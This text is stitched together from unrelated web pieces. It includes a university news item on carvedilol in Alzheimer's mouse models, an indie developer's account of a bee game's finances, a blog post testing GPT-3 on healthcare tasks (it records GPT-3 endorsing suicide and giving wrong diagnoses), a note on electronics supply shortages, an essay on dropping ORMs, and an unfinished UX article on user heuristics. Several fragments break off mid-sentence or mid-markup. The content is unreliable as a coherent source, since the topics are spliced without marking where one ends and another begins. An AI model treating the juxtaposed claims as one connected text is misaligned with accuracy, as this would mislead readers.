<h3><strong><span><span><span><span>The science behind the findings</span></span></span></span></strong></h3>

<p><span><span>Previous research has shown that the progression of Alzheimer’s disease is driven by a vicious cycle of the protein amyloid β (Aβ) inducing hyperactivity at the neuron level. However, the mechanism behind this wasn’t fully understood nor were there effective treatments to stop the cycle. &nbsp;</span></span></p>

<p><span><span>Chen’s team used a portion of an existing drug used for heart patients, carvedilol, to treat mice models with Alzheimer’s symptoms. After a month of treatment, researchers tested animal models with very promising results. </span></span></p>

<p><span><span>“We treated them for a month and the effect was quite amazing,” says Chen, explaining the drug was successful in reversing major symptoms of Alzheimer’s disease. “We couldn’t tell the drug-treated disease models and the healthy models apart.” </span></span></p>

<p><span><span>Chen, a Clarivate Highly Cited Researcher, is optimistic about the future of this research, noting the next step will be clinical trials in people.</span></span></p>

<p><em><span><span>Wayne Chen is a professor in the Department&nbsp;of Physiology and Pharmacology, Biochemistry and </span></span><span><span>Molecular Biology at the CSM.&nbsp;</span></span></em><span><span><em><span lang="EN-US"><span><span>Led by the&nbsp;</span></span></span></em><a href="http://www.hbi.ucalgary.ca/"><em><span><span><span><span><span>Hotchkiss Brain Institute</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>,&nbsp;</span></span></span></em><a href="http://www.ucalgary.ca/research/brain-and-mental-health"><em><span><span><span><span><span>Brain and Mental Health</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>&nbsp;is one of six research strategies guiding the University of Calgary toward its&nbsp;Eyes High&nbsp;goals.

			<p>In Beecember last year, I released a bee-themed management simulator called <a href="http://hivetime.twolofbees.com/">Hive Time</a>. For this project, I was in a position to commit to pay-what-you-want pricing. Now that the game's been out for a while and its lifetime sales curve feels established, I wanted to take some time to reflect on how that's gone.</p>

			<p><img src="http://cheesetalks.net/images/hive-time-finances/banner.png" alt="Money for the honey! A look at Hive Time's finances and pay-what-you-want pricing."></p><p>Hive Time is a bee themed management sim in which players build and maintain a sustainable bee hive. It's a niche game that aims to provide a sandbox experience in which players can explore and experiment role diversity with a generational community once they've mastered the sustainability requirement of producing enough Royal Jelly to spawn a new Queen. It's punctuated by humour and zany characters who from time to time upset the balances that players work to achieve.</p>

			<p>This article dives into Hive Time's budget, costs, marketing, and revenue between the game's release in December 2019 and reaching a sales milestone in July 2020.</p>

			<h2 id="before-we-begin">Before we begin</h2>

			<p>Before diving in, this article needs to be prefaced with a few important notes:</p>
			<ul>
				<li>I don't mind talking about money, but I absolutely despise fixating on it. This has been a difficult article to write.</li>
				<li>So as to stay on topic, I'll avoid diving into what worked/didn't work about the game itself (as opposed to its marketing, its identity, and its "performance") as much as possible.</li>
				<li>My overheads and living costs are significantly low and are not indicative of typical development costs.</li>
				<li>I'm very happy to have worked on Hive Time and am glad that it has been played and enjoyed by so many people.</li>
				<li>Every game is different, every audience is different, and the specifics of the context in which every game exists are different.</li>
				<li>Hive Time's budget and expenses involve multiple currencies. Where unspecified, assume Australian dollars.</li>
				<li>From one perspective, I did everything discussed in this article myself, but realistically, every player, every journalist, every youtuber, every streamer, every tester, and my four collaborators contributed to Hive Time's post-release identity. Without them, my game would have sat unknown, unloved, and (so far as what's relevant to this article goes) unbought.</li>
			</ul>


			<p><a href="#pageContent">↑return to page top↑</a></p><h2 id="budget-none-costs-some">Budget: None, Costs: Some</h2>

			<p>After completing the <a href="https://www.patreon.com/posts/small-project-26593300">10 day jam</a> that <a href="https://twitter.com/mimlofbees">Mim</a> and I initially prototyped Hive Time for in May 2019, I took most of the rest of the month to weigh up continuing development against getting back onto other outstanding projects. Based on positive responses to the progress I'd been sharing and tester feedback, I decided to move ahead and plan out a zero dollar budget and rough six month timeline for development.</p>

			<p>Initially, my budget was comprised of my own labour donated in-kind with the expectation of recouping my labour costs after release. Mim was undecided about contributing further art, but preferred to donate her contributions if that happened (it did). With this approach, I'm free from having to worry about money as a tangible development resource, which is generally how I prefer it when I'm working solo. It also means that if a project doesn't sell a single copy, I don't have any debts or other obligations that I'd need to invest more unpaid work into fulfilling.</p>

			<p>For the sake of similar simplicity, I also considered things like plant and equipment, utilities costs, and exhibiting costs as out of scope for the budget since all of those were things that I already owned or could justify as being covered by other projects. I bought my primary workstation and travel laptop years ago, we would be paying for home power and internet regardless, and I have a big tub worth of spare mice and keyboards, cables, adapters, tablecloths, A4 table stands, etc. left over from exhibiting other games in the past. Since I was working from home, I didn't have office rent to worry about (but I did have to ignore my mortgage for a little while). These are all real overheads that should not be ignored, but are outside the scope of what I will be covering here - in this case, there's so much overlap with my personal living expenses and they're low enough that I could comfortably pay them out of Hive Time revenue if it makes enough that I can pay myself the equivalent of Australia's <a href="https://www.fwc.gov.au/documents/wage-reviews/2018-19/decisions/c20191-order.pdf">National Minimum Wage</a>.</p>

Stephens Apiarists in Mole Creek, Tasmania (photo courtesy of Mim)."></p><p>Me recording bees at R. Stephens Apiarists in Mole Creek, Tasmania (photo courtesy of <a href="https://twitter.com/mimlofbees">Mim</a>)</p>

			<p>I use Free/Open Source software for all of my development tools, and though I donate and contribute upstream to some projects, I've chosen to not include that in the budget since that's something I'd be doing regardless. The tools I used for developing Hive Time were the <a href="https://godotengine.org/">Godot Engine</a>, <a href="https://www.blender.org/">Blender</a>, the <a href="https://gimp.org/">GNU Image Manipulation Program</a>, <a href="https://inkscape.org/">Inkscape</a>, and <a href="https://www.audacityteam.org/">Audacity</a>.</p>

			<p>I was hoping to submit Hive Time to the 2020 PAX Australia Indie Showcase, which I would have had to have allocated a travel budget for (exhibiting costs are typically covered for showcase winners), but since PAX Aus didn't happen this year and PAX Online's Indie Showcase was <a href="https://twitter.com/ValiantCheese/status/1274166825056518144">only available to games on Steam</a>, that became one less expense to worry about.</p>

			<p>I did spend about $175 on some <a href="https://twitter.com/ValiantCheese/status/1209741464726454273">business cards</a>, but given that a global pandemic is not the best time to be handing things around to people or circulating in contexts where one would normally hand things out, they've sat unused. Since some very extenuating circumstances prevented me from using them, we can pretend for the purposes of this article that I didn't buy them.</p>

			<p>Although I had planned to do everything myself and only rely on Mim for things she was interested in contributing along the way, I found myself bringing on board other collaborators who helped elevate the project in ways that I wouldn't have been able to on my own.</p>

			<p>When <a href="http://www.kestrelpi.co.uk/">Peter</a> expressed interest in composing a soundtrack and demonstrated that he understood and had enthusiasm for the project, I decided to give him the opportunity. I wanted to be sure I could pay him adequately, so I dug into <a href="https://www.patreon.com/Cheeseness">Patreon</a> funds that I'd planned to use for <a href="http://winterswake.com/">Winter's Wake</a> with the expectation that based on general enthusiasm for the project, I should be able to make that back as a minimum from Hive Time's revenue. As <a href="https://kestrelpi.bandcamp.com/album/hive-time">the soundtrack</a> expanded and took shape, we decided to produce a human-voiced version of the Beatles homage "Beeing Together," which carried some extra costs for a vocalist and recording time.</p>

			<p><img src="http://cheesetalks.net/images/hive-time-finances/queen_portrait_event.png" alt="The initial Queen portrait that shipped in the first version of Hive Time."></p><p>Several days before release, I had resolved to cut a feature that adorned the Throne Room with portraits of passed Queens in order to keep my workload manageable. During an unrelated conversation, <a href="https://twitter.com/AubreySerr">Aubrey</a> offered to help out, painting the <a href="https://twitter.com/ValiantCheese/status/1204911573564706816">initial portrait</a> that appeared in 1.0-x releases as well as the eight portraits that were added in the <a href="https://cheeseness.itch.io/hive-time/devlog/147869/v11-the-informational-update">Informational Update</a>. Aubrey has doggedly refused to let me pay him, but he has kindly given me an indicative rate to use in this article.</p>

			<p>I also gave out around a hundred or so keys before release to people interested in giving feedback on/playing early builds. I've had to rely on volunteer testing for projects in the past, and had a <a href="https://twitter.com/ValiantCheese/status/1207441828619776000">solid core group</a> of experienced testers who've enjoyed working with me in the past enough to want to contribute their invaluable attention. Ideally, I'd like to be in a position to do paid QA/testing on my games and give back to these people, but sadly, that wasn't an option for this project. As I didn't audit their work or demand a minimum amount of attention, I have no way of gauging even a rough figure for the amount of hours these people have invested in Hive Time (it could be as little as ten, or it could be hundreds or thousands), and so I'll be leaving QA out (aside from my own testing as part of development/bug fixing, but as with proof reading, you're much less likely to find the holes in your own work).</p>

			<p>Prior to release, but after the bulk of development was completed, I was contacted by an arts funding agency that was getting into games. After some discussion and reading terms, I decided to decline the recoupable investment they were offering. Since I'd already spent all the money I was going to spend, and paying back that investment pro-rata would just erode my revenue until it was paid back, it didn't feel like a good fit. I could potentially have used that funding to produce more content, but I had a release date more or less locked in, and it didn't make sense to push things back just so that I could get a loan of money I didn't need. I also considered using it to cover localisation, but with some rough post-release development making the game's content a moving target, I didn't want to commit to localising into languages I don't speak until after the game has made enough money to support itself (otherwise the risk is that I'd just end up shipping the game in more languages that it could be unsuccessful in).</p>

October 27, 2020 | https://www.nabla.com/blog/gpt-3/ | <a href="https://web.archive.org/web/*/https://www.nabla.com/blog/gpt-3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>You may have heard about GPT-3 this summer, the new cool kid on the AI block. GPT-3 came out of OpenAI, one of the top AI research labs in the world which was founded in late 2015 by Elon Musk, Sam Altman and others and later backed with a $1B investment from Microsoft.</p>
<p>You’ve probably also heard about the ongoing AI revolution in healthcare, thanks to promising results in areas such as automated diagnosis, medical documentation and drug discovery, to name a few.
Some have claimed that algorithms now outperform doctors on <a href="https://hbr.org/2019/10/ai-can-outperform-doctors-so-why-dont-patients-trust-it">certain tasks</a> and others have even announced that robots will soon receive <a href="https://www.forbes.com/sites/insights-intelai/2018/09/21/the-ultimate-physicians-assistant/">medical degrees</a> of their own! This can all sound far-fetched... but could this robot actually be GPT-3?</p>
<p>Our unique multidisciplinary team of doctors and machine learning engineers at Nabla had the chance to test this new model to tease apart what’s real and what’s hype by exploring different healthcare use cases.</p>
<p><img src="https://www.nabla.com/uploads/gp0.jpg" alt="Primary care and GPT-3"></p>
<h2>But first, coffee</h2>
<p>In machine learning, a language model like GPT-3 simply tries to predict a word in a sentence given the previous words, called the context. It’s a supercharged autocomplete system like the one you may use with Gmail. Being able to predict the next word in a sentence seems deceptively simple at first, but this actually enables many compelling use cases, such as chatbots, translation or Q&amp;A.</p>
<p>At the time of writing, GPT-3 is the most complex language model ever trained, with a whopping 175 billion parameters in total - that’s as many knobs that are fine-tuned over weeks of intensive cloud computing to make the AI magic work. Certainly a huge number, but still way below the 100 (or maybe 1000+) trillion synapses in the human brain that enable reasoning, perception and emotions.</p>
<p>Thanks to the large size of the model, GPT-3 can be applied on new tasks and ‘few-shot’ demonstrations without any further fine-tuning on specific data. In practice, this means the model can successfully understand the task to perform with only a handful of initial examples. This property is a huge improvement compared to previous, less complex language models, and is much closer to actual human behavior - we don’t need thousands of examples to distinguish a cat from a dog.</p>
<p>Despite obvious biases learned from the data used for training - basically books plus the whole Internet, from Wikipedia to the New York Times - GPT-3's ability to transform natural language into websites, create basic financial reports, solve langage puzzles, or even generate guitar tables has been very promising so far. But what about healthcare?</p>
<h2>Then, the obvious disclaimer</h2>
<p>As Open AI itself warns in GPT-3 guidelines, healthcare “is in the high stakes category because people rely on accurate medical information for life-or-death decisions, and mistakes here could result in serious harm”. Furthermore, diagnosing medical or psychiatric conditions falls straight in the “unsupported use” of the model. Despite this we wanted to give it a shot and see how it does on the following healthcare use cases, roughly ranked from low to high sensitivity from a medical perspective: admin chat with a patient, medical insurance check, mental health support, medical documentation, medical questions &amp; answers and medical diagnosis. We also looked at the impact of some parameters of the model on the answers - spoiler alert, it’s fascinating!</p>
<h2>GPT-3, your next medical assistant?</h2>
<p>Our first tests showed that GPT-3 seemed to work for basic admin tasks such as appointment booking, but when digging a bit we found that the model had no clear understanding of time, nor any proper logic. Its memory also sometimes fell short - for the appointment in the example below, the patient’s initial 6pm constraint is overlooked as GPT-3 suggests booking for 7pm after a few messages.</p>
<p><img src="https://www.nabla.com/uploads/gp1.jpg" alt="Medical assistant example with GPT-3"></p>
<h2>What about insurance checks?</h2>
<p>Similar to the admin tasks above, GPT-3 could help nurses or patients to quickly find a piece of information in a very long document, like finding insurance benefits for specific medical examinations. In the example below we seeded the model with a 4-page standard benefits table that shows a $10 copay for an X-ray, $20 for an MRI exam, and then asked 2 simple questions. GPT-3 was able to get the copay for an X-ray but could not sum up the copays for several exams, which again highlights a lack of basic reasoning.</p>
<p><img src="https://www.nabla.com/uploads/gp2.jpg" alt="Insurance checks example with GPT-3"></p>
<h2>Recycle to relieve stress!</h2>
<p>Relax on your living room sofa and talk, GPT-3 will listen to your problems endlessly and may even give you some actionable tips! This is probably one of the best use cases for GPT-3 in healthcare, and it’s not so surprising given the already good results from the Eliza algorithm back in 1966, which managed to give a human touch with only pattern matching rules operating behind the scenes.</p>
<p>One key difference between the two approaches though is that rule-based systems like Eliza were in full control of the computer’s response. In other words, we are certain that nothing potentially harmful could be said.</p>
<p>This contrasts with the example below in which GPT-3 sadly tells us that committing suicide is a good idea…</p>
<p><img src="https://www.nabla.com/uploads/gp4.jpg" alt="Kill switch example with GPT-3"></p>
<p>The model can also shoot unexpected answers where it suggests recycling more to ease stress - using a rationale which, while being convoluted, is actually quite sensible!</p>
<p><img src="https://www.nabla.com/uploads/gp3.jpg" alt="Recycling and stress example with GPT-3"></p>
<h2>Medical documentation</h2>
<p>GPT-3 has already shown promising results in summarizing and simplifying text, something that could be very useful for patients to understand medical reports often full of jargon, or for doctors to quickly get the gist of a patient’s long medical history. Well, GPT-3 is probably not quite ready for this (yet?). Our tests show dangerous oversimplifications, difficulties to associate causes and consequences, and once again a lack of basic deductive reasoning.</p>
<h2>Medical Q&amp;A: not as good as good ol’ Google yet</h2>
<p>When looking for specific scientific information, drug dosages or prescription support, our experiments show that GPT-3 is not reliable enough to be safely used as a trustworthy support tool for doctors. One serious concern is that GPT-3 very often gives wrong yet grammatically correct answers, with no scientific reference that a physician could check. A tired doctor caught in the rush of an emergency department could easily confuse a syntactically sound statement for a medically valid one. For example the first answer below is correct but not the second.</p>
<p><img src="https://www.nabla.com/uploads/gp5.jpg" alt="Q&amp;A medical example with GPT-3"></p>
<h2>Diagnosis: at your own risk</h2>
<p>A more complex Q&amp;A task is diagnosis: input symptoms and get possible underlying conditions that may explain these symptoms. Recent symptom checker systems (Babylon, Ada, KHealth, etc.), if not perfect, seem to be a better option here than GPT-3 as they’ve been carefully optimized for this sole purpose. One benefit of these systems is that they can output different diagnoses with their probabilities, which acts as a measure of confidence for the practitioner. If the first diagnosis example below GPT-3 ignores the fever of the little girl that suggests ethmoiditis and mentions a “rash” that does not exist.</p>

<p>In another test, GPT-3 misses a pulmonary embolism. Fortunately nobody died here!</p>
<p><img src="https://www.nabla.com/uploads/gp7.jpg" alt="Medical diagnosis 2 example with GPT-3"></p>
<h2>Under the hood</h2>
<p>As others have observed, the quality of GPT-3 outputs is much impacted by the seed words used - the same question formulated in two different ways can result in very different answers. The model’s various parameters, such as the temperature and the top P also play a big role. Temperature and top P control the risks and creativity that the engine will exhibit in its answers.</p>
<h3>Temperature</h3>
<p>For the same input and a high temperature we get two answers with very different tones telling two opposite things. Here is an example with T = 0.9.</p>
<p><img src="https://www.nabla.com/uploads/gp8.jpg" alt="High temperature parameter and GPT-3"></p>
<p>By contrast, a similar seed with a very low temperature (T = 0) will always result in the same and quite straightforward answer.</p>
<p><img src="https://www.nabla.com/uploads/gp9.jpg" alt="Low temperature parameter and GPT-3"></p>
<h3>Frequency penalty and presence penalty</h3>
<p>It is also pertinent to mention the frequency penalty and presence penalty parameters, which prevent both word repetition and subject repetition. In a medical context, the intuition would be to reduce them as much as possible since a too abrupt subject switch can be very confusing and repetition can actually be pedagogical. However, comparing two conversations where the human asks the same questions, we clearly observe that the model with repetition penalties seems more empathic and friendly than the other one which appears cold and too repetitive to be human. Here is an example with no penalty.</p>
<p><img src="https://www.nabla.com/uploads/gp10.jpg" alt="No penalty parameter and GPT-3"></p>
<p>And an example with full penalty.</p>
<p><img src="https://www.nabla.com/uploads/gp11.jpg" alt="Full penalty parameter and GPT-3"></p>
<h2>Conclusion</h2>
<p>As warned by OpenAI, we are nowhere near any real time scenario where GPT-3 would significatively help in healthcare. Because of the way it was trained, it lacks the scientific and medical expertise that would make it useful for medical documentation, diagnosis support, treatment recommendation or any medical Q&amp;A. Yes, GPT-3 can be right in its answers but it can also be very wrong, and this inconsistency is just not viable in healthcare. Even for more administrative tasks such as translating or summarizing medical jargon, GPT-3 while promising is still many moons away for a production use case actually supporting doctors. We’re still in this phase where multiple, narrow-task supervised models win over a single, very ambitious approach.</p>
<p>That being said, GPT-3 seems to be quite ready to fight burnout and help doctors with a chit-chat module. It could bring back the joy and empathy you would get from a conversation with your medical residents at the end of the day, that conversation that helps you come down to earth at the end of a busy day. Also, there is no doubt that language models in general will be improving at a fast pace, with a positive impact not only on the use cases described above but also on other important problems, such as information structuring and normalisation or automatic consultation summaries.</p>
<p>And at Nabla, we are working on it!<br>

<p>The Global Electronics supply chain is in a strange place right now. Ostensibly the world’s economy is slowing down with massive unemployment all over and surging Covid cases in many parts of the world.  Despite that, if you try to buy many types of electronic components you will find lead times extending into next year and outright shortages of all kinds of components. </p>



<p>There are a few things going on here. First, despite the lockdowns, or maybe because of them, people are still buying a lot of electronics. There are definite signs that consumers have been stocking up on gadgets as they fit out their Zoom lairs. It is also the season of the year when all the new phones come out ahead of Christmas and Chinese New Year. Components are always tight around this time as the big handset and PC companies gear up their production for Holiday orders. As one component vendor told us “If your name is not Apple, you probably can’t get that part.”</p>



<p>On top of that, many suppliers are operating under capacity constraints as a result of Covid shutdowns. China has largely opened up again, but many companies there are still racing to catch up after months of being closed. </p>



<p>This has not only caused a direct shortage, but it has had a large indirect impact as large component buyers worried about shortages started “double ordering” a few months back. That is to say, they ordered more than they really thought they would need to make sure they were at the head of the line when parts get rationed out. This problem occurs every few years, but is particularly acute this year for all the standard 2020 reasons. </p>



<p>On top of that, there is Huawei. Huawei ordered as many components as they could ahead of the US sanctions. There are all kinds of examples of this from TSMC all the way down. And of course, their stockpiling fed into the double ordering panic above. </p>



<p>Making matters worse, every company we speak to in China is worried that they are next. This is not wholly rational, but then again, Uncertainty is the order of the day. So there are dozens of large Chinese companies stockpiling parts, just in case they come under the scrutiny of the Eye of the US Government. And of course, this feeds into all the factors above. </p>



<p>One of the hardest parts of all this is that it is so hard to predict. The Global Electronics Supply Chain is complicated. Take a semiconductor as an example. The part is likely produced in Taiwan or Korea, then sent to Malaysia for testing, then sent to Singapore for packaging, then sent to China for assembly into a module. That module may then be sent back for testing before sent to China again for final assembly into a phone or other device. If there is a shortage of some part or factory capacity anywhere along this chain, the whole thing backs up. The industry has gotten pretty good about smoothing out these wrinkles, but this year we are pushing all the bounds. </p>



<p>We have found that a lot of the time it is the most ignored, taken-for-granted parts that are in the shortest supply. How often do you think of the plastic packaging or substrate in which a semiconductor sits? Not often? Don’t feel bad, a lot of supply chain people do not think of these much either. So of course, those are out of stock everywhere right now, adding a month or more to some timelines. </p>



<p>The strangest part is that in all of this discussion of supply shortages there is  little thought given to the demand side. Maybe the economy will remain strong and these supply shortages will go away. Or maybe, we are just seeing a cascading series of temporary supply constrictions, and all the woes of 2020 finally catch up with the broader economy. In years past, double ordering usually ended poorly for the company that temporarily benefited from tight supply. All too often those buyers fighting to jump the queue ended up canceling orders at the last minute, leaving mountains of supplier inventories and financial woe in their wake. Our best guess is that we end up somewhere in between those two extremes. There are some legitimate reasons that capacity is scarce right now, but there are equally many cases of ephemeral demand. So spare a thought for your operations team, and maybe have them call all your suppliers again, for every component. Just to double check. </p>

<p>For starters, this post is not a theoretical demonstration regarding whether you should use or not use ORMs (Object Relational Mapping) in your projects. It’s a description of why, in my own context, I decided to stop using ORMs. The ambition is to give a particular point of view that may be of use for people working in tech, to make up their mind.</p>



<p><strong><span>The Context</span></strong></p>



<p>First, the context. I’ve been working for 6 years as a tech startup CTO, at times as a cofounder, at times as a freelance. I’ve worked in or with a dozen of tech teams, using various kinds of technologies. Some teams were venture-backed, some were not.<br>If I had to sum up the context for the subject at hand, I would say that my point of view on ORMs is relevant for startup tech teams with &lt; 30 persons.</p>



<p>When I started coding, like most people, I started with a specific language, and that was not SQL. So, as soon as I started to need using a database, I naturally used ORMs to handle the database stuff. If we’re being honest here, most people don’t do a thorough research regarding the ORM topic, and just end up using one because they feel like they can get things done quicker, in a language they’re familiar with. I myself began coding in Python, and I quickly ended up using Django.</p>



<p>As time passed, I began appreciating several things about it, especially the migrations management part. Having all data schema modifications done in code (= versioned in Git) felt safer, especially when working with other people on that data schema. As the complexity of my projects grew, the backend code became more and more complex, but I didn’t give it second thoughts, since I had always used ORMs.<br>One thing that bothered me is that each time a requirement a little bit complex came up on a project, I had to dig very deep in the ORM documentation, like if I was cursed and that when a customer asked me something it would invariably be a specific corner case where the ORM fell short.</p>



<p>One day, I started taking data science projects, and I started learning SQL, since I had to perform a lot of queries on structured data.<br>I did my research and for various reasons I ended up selecting Postgres for my database of choice, due to its open source nature, its awesome views features (named reusable SQL queries), and its GIS extension Postgis.<br>One thing leading to the other, I worked on multiple data science projects in a row, and began to be quite good with SQL. It started to dawn on me how quick I was to make complex queries, with very few lines of SQL code.<br>I then worked again on web projects, and with my experience in SQL, decided that this time I would still write the backend in Python, but without ORM, and use a database driver instead (Psycopg2) to interact with the DB (database).</p>



<p>It has been a few years now that I work without ORMs, and I think my productivity more than doubled. I’m currently a freelance CTO, and I’m responsible (among other things) for the production infrastructure, including database schemas, of 4 startups.<br>I tried to analyze retrospectively what happened and here are a few thoughts.</p>



<p><strong><span>There is no Free Lunch</span></strong></p>



<p>ORM make one promise: that they will abstract the DB away. Solving problems in a generic way that works for everybody can mean 2 things: either it’s a technological breakthrough, either someone made some kind of middle-ground trade-off with existing tech. ORMs clearly fall in the latter.<br>ORMs make so many abstractions that starting off may be easier, but very quickly as you encounter more evolved real-world use cases, you end up spending your time reading documentation to understand the ORM abstractions, and how to configure it the way you need.</p>



<p>When a piece of software abstracts away a problem for you, if the scope of the problem is well defined, you can end up always using sensible defaults config parameters and a few of their variants. In this case, abstraction is a winning proposition.<br>The problem with ORMs is that the scope of what they usually try to achieve is too big, and in a real-world situation, when complexity arises, you often end up reading dark corners of your ORM documentation to find out whether your situation can fit in their abstractions. A great <a rel="noreferrer noopener" href="http://blogs.tedneward.com/post/the-vietnam-of-computer-science/" target="_blank">blog post</a> sums this up:  </p>



<p>“Although it may seem trite to say it, Object/Relational Mapping is the Vietnam of Computer Science. It represents a quagmire which starts well, gets more complicated as time passes, and before long entraps its users in a commitment that has no clear demarcation point, no clear win conditions, and no clear exit strategy.”</p>



<p>ORMs often seemed at first to be a winning proposition, but as time passes, I spent more time reading complex documentation for seemingly simple real-world situations, and I realized that the scope of what ORMs try to accomplish is just too large. When life keeps throwing at you different use cases with many little variants (and rest assured, this never stops), any endeavour to abstract it all quickly turns into a quagmire.</p>



<p><strong><span>Requirements You don’t have</span></strong></p>



<p>A huge problem of ORMs is that they abstract away the database, which means that if you have a favorite database, you can’t use its specific features.<br>If we’re being honest, in the context I’m talking about (startup with tech team &lt; 30 persons), who really needs DB portability?<br>The DB field is competitive and different DBs do differentiate themselves with great features (MySQL, Postgres, Mongo…). Abstracting the DB away means you have to settle for a common denominator, which is usually frankly quite mediocre.</p>



<p>For example, if in Django you need to perform a classic array aggregation, you end up using django.contrib.postgres.aggregates module, and lose DB portability right away. Array aggregations are very useful in many use cases, but not all DB propose it, so you end up using DB-specific modules anyway.</p>



<p><strong><span>The Performance Problem</span></strong></p>



<p>ORMs usually come with a SQL generator, that you’re never supposed to see. Problem is, in real-life, your DB schema will eventually get complex enough, and you will start having performance issues.<br>Business requirements change over time, retrocompatibility requirements pile up, and there is no way you can keep your DB schema theoretically optimal for your company’s needs at time t.<br>This fact translates into increased complexity for your DB queries, and a need to be smart about your queries.<br>When this complexity increases a bit, there is simply no way the ORM SQL generator can output optimized queries. Things will get slow, and I’ve yet to see an efficient way of querying a complex DB other than by writing the SQL yourself.</p>



<p><strong><span>DB Schema Consistency</span></strong></p>



<p>Initially I loved ORM for the fact that data structures were defined in code, which means versioned in Git, which means people could collaborate on them. Over the years I’ve changed my mind completely about this. Having multiple people make changes on DB schema invariably leads to huge inconsistencies, suboptimal choices and huge legacy.<br>This is why I enjoy working in small teams. I know it’s not possible for big corporations to have only 1 or 2 guys be the data masterminds, and I think that’s the reason why software quality drops so rapidly with the size of an organization. We just don’t know how to work efficiently in tech when the problem becomes too big for one brain (and by the way I think this is one of the biggest challenges to the advancement of humankind but that’s a story for another time).<br>I think that in the context of a startup with a tech team &lt; 30 persons, you should not have multiple persons making decisions about the DB schema. There should be 1 owner for this (which does not mean there can’t be collaborative discussions of course).<br>Currently I usually am the owner of DB schemas, and I manage SQL migrations by hand, via SQL scripts that are versioned in git, separately from backend code repos. I’m still regularly surprised by how many bad product/code decisions become obvious when considering DB schema issues, with context and history in mind.</p>



<p><strong><span>Be pragmati</span><span>c</span></strong></p>



<p>I had the opportunity to discuss the ORM topic with friends, and many had experienced more or less the same things, however some of them had an interesting take on the matter: they kept using ORMs, but only for particular things such as migrations management, handling connection pools with DB (for concurrent querying), input validations… To come back to the Vietnam analogy, I think it’s perfectly OK to use ORMs, if you know exactly what for, with a clear goal in mind and a well defined perimeter.</p>



<p><strong><span>The stack I use now</span></strong></p>



<p>Now when I start a web project, on the backend side I set up a REST API with a lightweight HTTP framework (Flask in Python, ExpressJS in Javascript), I interact with the DB with a driver (Psycopg2 in Python, pg-native in NodeJs), and I use Postgres, with a heavy use of Postgres Views to put as many data-related code in SQL, and as few as possible in backend Python/Js code.</p>



<p>The resulting backends, if you know SQL, are insanely quick to write, easy to read, and thus to maintain.</p>

</figure>

<p>We like to apply labels to users: they’re irrational, lazy, unpredictable, rushed, and so on.</p>

<p>To some extent that may be true<span>—</span>we aren’t machines.</p>

<p>But research shows that users actually make decisions based on a set of predictable subconscious patterns.</p>

<p>To create satisfying digital experiences, UX designers should be aware of<span>—</span>and support<span>—</span>these cognitive habits.</p>

<h2 id="heuristics">Heuristics</h2>

<p>Human beings use psychological tactics and biases to get to decisions quickly. These mental shortcuts are called <a href="https://www.amazon.com/Thinking-Fast-Slow-Daniel-Kahneman/dp/0374533555" target="_blank">heuristics</a>. We use heuristics in everyday life, but we especially like using them with software.</p>

<p>We don’t follow these patterns out of laziness or because we’re scatter-brained. It’s quite rational to take advantage of heuristics as a user because…</p>

<ul>
  <li>In the digital world, there’s <strong>very little penalty for being wrong</strong>. The cost of most errors is close to zero. Guessing wrong on a link and hitting the back button is still more efficient than reading the whole page to find an exact match.</li>
  <li>Carelessly clicking around is <strong>more fun</strong> because we get a small dopamine rush from each click.</li>
  <li>Web pages can be complicated. We’d rather <strong>make a decision and get on with our lives</strong>. It’s a matter of trade-offs<span>—</span>a balancing act.</li>
  <li>The web enables us to <strong>move quickly from one decision to the next</strong>, at a much faster pace than the physical world. So that’s what we do.</li>
</ul>

<p>Let’s take a look at some of the most common heuristics that users employ.</p>

<h3 id="satisficing">Satisficing</h3>

<p>A combination of the words “satisfy” and “suffice.” It means to <a href="https://www.nngroup.com/articles/satisficing/" target="_blank">settle for the first reasonable option you find</a>, without considering the whole set of possibilities. We don’t look for the right answer<span>—</span>we look for whatever is good enough.</p>

<figure>
    <img src="https://learnuxd.io/img/posts/user-decisions/satisficing.png" alt="Users make quick and dirty scans. When they come across something that refers even a little to what they've come for, they instinctively click it.">
</figure>

<h3 id="loss-aversion">Loss Aversion</h3>

<p><a href="https://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.320.8769" target="_blank">Losses loom larger than gains</a> in our minds. It is thought that the pain of losing is about twice as powerful as the pleasure of gaining. We put in more work and take more risks to avoid losses than we do to make gains. Part of <a href="https://www.nngroup.com/articles/prospect-theory/">Prospect Theory</a>.</p>

<figure>
    <img src="https://learnuxd.io/img/posts/user-decisions/loss-aversion.png" alt="Users will go to great lengths to avoid something that’s potentially negative, or that could cause them to lose what they already have.">
</figure>

<h3 id="availability">Availability</h3>

<p><a href="https://www.nngroup.com/videos/availability-heuristic/" target="_blank">People draw conclusions based on what comes to mind immediately</a>. We give a lot of importance to things that we recall quickly and things we can already see right in front of us.</p>

<figure>
    <img src="https://learnuxd.io/img/posts/user-decisions/availability.png" alt="If a user needs to make a decision on a page, what's right in front of them? What can they recall quickly from other pages? What do they notice first?">
</figure>

<h3 id="decision-fatigue">Decision Fatigue</h3>

<p>Making a lot of decisions <a href="https://archive.org/details/psychologyofecon0000unse/mode/2up" target="_blank">lowers a person’s ability to make rational ones</a>. It’s also exhausting.</p>

<figure>
    <img src="https://learnuxd.io/img/posts/user-decisions/decision-fatigue.png" alt="If a user is forced to make decision after decision after decision, they'll eventually start making sub-optimal choices... or give up entirely.">
</figure>

<h3 id="reference-dependence">Reference Dependence</h3>

<p>Human beings do not have an innate way to determine absolute value. So <a href="https://www.uxmatters.com/mt/archives/2011/01/the-power-of-comparison-how-it-affects-decision-making.php" target="_blank">we assign value by comparing one thing to another</a>. We make judgments in relative rather than absolute terms.</p>

<figure>
    <img src="https://learnuxd.io/img/posts/user-decisions/reference-dependence.png" alt="In a set of choices in an interface, how the options relate to each other will determine what the user will do.">
</figure>

<h3 id="status-quo-bias">Status Quo Bias</h3>

<p>Unless there’s a compelling incentive, <a href="https://www.nngroup.com/articles/the-power-of-defaults/" target="_blank">people are more likely to stick to the default</a>. In other words, we tend not to change the established situation.</p>

<figure>
    <img src="https://learnuxd.io/img/posts/user-decisions/status-quo-bias.png" alt="This explains, for example, why users rarely utilize fancy customization features or change default settings.">
</figure>

<h3 id="hicks-law">Hick’s Law</h3>

<p>The number of stimuli present <a href="https://lawsofux.com/hicks-law" target="_blank">influences the time and effort required to make a decision</a>.</p>

<figure>
